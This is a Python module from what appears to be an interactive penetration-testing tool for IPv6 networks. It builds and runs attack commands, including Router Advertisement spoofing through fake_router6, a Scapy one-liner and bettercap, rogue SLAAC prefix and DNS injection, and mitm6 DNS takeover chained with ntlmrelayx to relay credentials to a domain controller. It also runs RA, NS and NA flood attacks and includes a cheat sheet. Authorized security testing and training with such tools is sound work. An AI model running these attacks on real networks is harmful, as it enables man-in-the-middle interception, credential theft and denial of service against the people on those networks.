"""IPv6 Attack Module - IPv6-specific exploitation: RA spoofing, SLAAC abuse, and more."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "ipv6"


def _host_discovery(session):
    """Discover IPv6 hosts on the local link."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    options = [
        ("1", "[bold]alive6[/bold]          - THC-IPv6 host discovery"),
        ("2", "[bold]Multicast ping[/bold]  - Ping all-nodes multicast"),
        ("3", "[bold]Nmap IPv6[/bold]       - Nmap IPv6 host scan"),
        ("4", "[bold]Passive sniff[/bold]   - Listen for IPv6 traffic"),
    ]
    choice = show_menu(options)

    cmds = {
        "1": f"alive6 {iface}",
        "2": f"ping6 -c 5 -I {iface} ff02::1",
        "3": f"nmap -6 --script targets-ipv6-multicast-echo -e {iface}",
        "4": f"tcpdump -i {iface} -nn -c 50 ip6",
    }
    if choice in cmds:
        run_with_preview(cmds[choice], session, STAGE)


def _ra_spoofing(session):
    """Router Advertisement spoofing to become default gateway."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    warning("[!] RA spoofing makes victims route traffic through you (IPv6 MITM).")
    if not confirm("Start Router Advertisement spoofing?"):
        return

    options = [
        ("1", "[bold]fake_router6[/bold]    - THC-IPv6 fake router"),
        ("2", "[bold]ra-attack[/bold]       - Custom RA with prefix"),
        ("3", "[bold]Bettercap[/bold]       - IPv6 RA spoof module"),
    ]
    choice = show_menu(options)

    if choice == "1":
        prefix = ask("Enter IPv6 prefix to advertise (e.g., 2001:db8::/64)", default="fd00::/64")
        cmd = f"fake_router6 {iface} {prefix}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "2":
        prefix = ask("Enter IPv6 prefix", default="fd00::/64")
        cmd = (
            f'python3 -c "'
            f"from scapy.all import *; "
            f"from scapy.layers.inet6 import *; "
            f"pkt = Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix='{prefix.split('/')[0]}', prefixlen={prefix.split('/')[1]}); "
            f"sendp(pkt, iface='{iface}', loop=1, inter=3)"
            f'"'
        )
        run_with_preview(cmd, session, STAGE)
    elif choice == "3":
        cmd = f'bettercap -iface {iface} -eval "set ndp.spoof.redirect true; ndp.spoof on"'
        run_with_preview(cmd, session, STAGE)


def _slaac_attack(session):
    """SLAAC (Stateless Address Auto-Configuration) abuse."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    info("SLAAC attack: Advertise a rogue prefix so victims auto-configure through you.")
    warning("[!] Victims will get a new IPv6 address and route traffic through you.")

    prefix = ask("Enter rogue IPv6 prefix (e.g., fd00:dead::/64)", default="fd00:dead::/64")
    dns = ask("Enter rogue DNS server IPv6 (or blank)")

    if dns:
        cmd = f"fake_router6 {iface} {prefix} dns={dns}"
    else:
        cmd = f"fake_router6 {iface} {prefix}"

    run_with_preview(cmd, session, STAGE)


def _mitm6(session):
    """mitm6 - IPv6 DNS takeover for Active Directory environments."""
    domain = ask("Enter target domain (e.g., corp.local)")
    if not domain:
        error("Domain required.")
        return

    info("mitm6 replies to DHCPv6 requests and sets attacker as DNS server.")
    info("Combine with ntlmrelayx for credential relay.")

    options = [
        ("1", "[bold]Basic mitm6[/bold]     - DNS takeover only"),
        ("2", "[bold]With relay[/bold]       - mitm6 + ntlmrelayx combo"),
    ]
    choice = show_menu(options)

    if choice == "1":
        cmd = f"mitm6 -d {domain}"
        run_with_preview(cmd, session, STAGE)
    elif choice == "2":
        relay_target = ask("Enter relay target IP (e.g., DC IP)")
        info("Run in separate terminal: ntlmrelayx.py -6 -t ldaps://{relay_target} -wh fakewpad.{domain} -l loot/")
        cmd = f"mitm6 -d {domain}"
        run_with_preview(cmd, session, STAGE)


def _ipv6_dos(session):
    """IPv6 denial-of-service attacks."""
    iface = ask("Enter network interface")
    if not iface:
        error("Interface required.")
        return

    warning("[!] DoS attacks. Use only on authorized targets!")
    if not confirm("Continue?"):
        return

    options = [
        ("1", "[bold]RA Flood[/bold]        - Flood router advertisements"),
        ("2", "[bold]NS Flood[/bold]        - Flood neighbor solicitations"),
        ("3", "[bold]NA Flood[/bold]        - Flood neighbor advertisements"),
    ]
    choice = show_menu(options)

    cmds = {
        "1": f"flood_router6 {iface}",
        "2": f"flood_solicitate6 {iface}",
        "3": f"flood_advertise6 {iface}",
    }
    if choice in cmds:
        run_with_preview(cmds[choice], session, STAGE)


def _ipv6_scan(session):
    """IPv6 port scanning and enumeration."""
    target = ask("Enter target IPv6 address")
    if not target:
        error("Target required.")
        return

    options = [
        ("1", "[bold]Quick scan[/bold]      - Top 1000 ports"),
        ("2", "[bold]Full scan[/bold]       - All ports + services"),
        ("3", "[bold]Vuln scan[/bold]       - IPv6 vulnerability scripts"),
    ]
    choice = show_menu(options)

    cmds = {
        "1": f"nmap -6 -sV {target}",
        "2": f"nmap -6 -sV -sC -p- {target}",
        "3": f"nmap -6 --script vuln {target}",
    }
    if choice in cmds:
        run_with_preview(cmds[choice], session, STAGE)


def _cheat_sheet():
    """IPv6 attack cheat sheet."""
    content = """# IPv6 Attack Cheat Sheet

## Key Concepts
- **SLAAC**: Stateless Address Auto-Configuration (no DHCP needed)
- **RA**: Router Advertisement (how routers announce themselves)
- **NDP**: Neighbor Discovery Protocol (IPv6 equivalent of ARP)
- **Link-local**: fe80::/10 (always present, not routable)
- **All-nodes multicast**: ff02::1

## Discovery
```
alive6 eth0                        # THC-IPv6 host discovery
ping6 -c 5 -I eth0 ff02::1       # Ping all nodes
nmap -6 --script targets-ipv6-multicast-echo -e eth0
```

## Attacks
```
# RA spoofing (become default gateway)
fake_router6 eth0 fd00::/64

# mitm6 (DHCPv6 DNS takeover)
mitm6 -d corp.local

# RA flood DoS
flood_router6 eth0

# IPv6 scanning
nmap -6 -sV target_ipv6
```

## Tools
- THC-IPv6 suite: alive6, fake_router6, flood_*
- mitm6: IPv6 DNS takeover for AD
- Bettercap: NDP spoofing module
- Scapy: Custom IPv6 packet crafting
- nmap: IPv6 scanning (-6 flag)

## Mitigations
- RA Guard on switches
- DHCPv6 Guard
- IPv6 First Hop Security (FHS)
- Disable IPv6 if not needed
"""
    show_knowledge(content)


def run(session):
    """IPv6 Attack module entry point."""
    show_stage_header("IPv6 Attacks", "IPv6-specific exploitation — RA spoofing, SLAAC abuse, mitm6")

    while True:
        options = [
            ("1", "[bold]Host Discovery[/bold]   - Find IPv6 hosts on network"),
            ("2", "[bold]RA Spoofing[/bold]      - Fake router advertisements"),
            ("3", "[bold]SLAAC Attack[/bold]     - Rogue prefix injection"),
            ("4", "[bold]mitm6[/bold]            - IPv6 DNS takeover (AD)"),
            ("5", "[bold]IPv6 DoS[/bold]         - Flood attacks"),
            ("6", "[bold]IPv6 Scanning[/bold]    - Port scan IPv6 targets"),
            ("7", "[bold]Cheat Sheet[/bold]      - IPv6 attack reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _host_discovery(session)
        elif choice == "2":
            _ra_spoofing(session)
        elif choice == "3":
            _slaac_attack(session)
        elif choice == "4":
            _mitm6(session)
        elif choice == "5":
            _ipv6_dos(session)
        elif choice == "6":
            _ipv6_scan(session)
        elif choice == "7":
            _cheat_sheet()
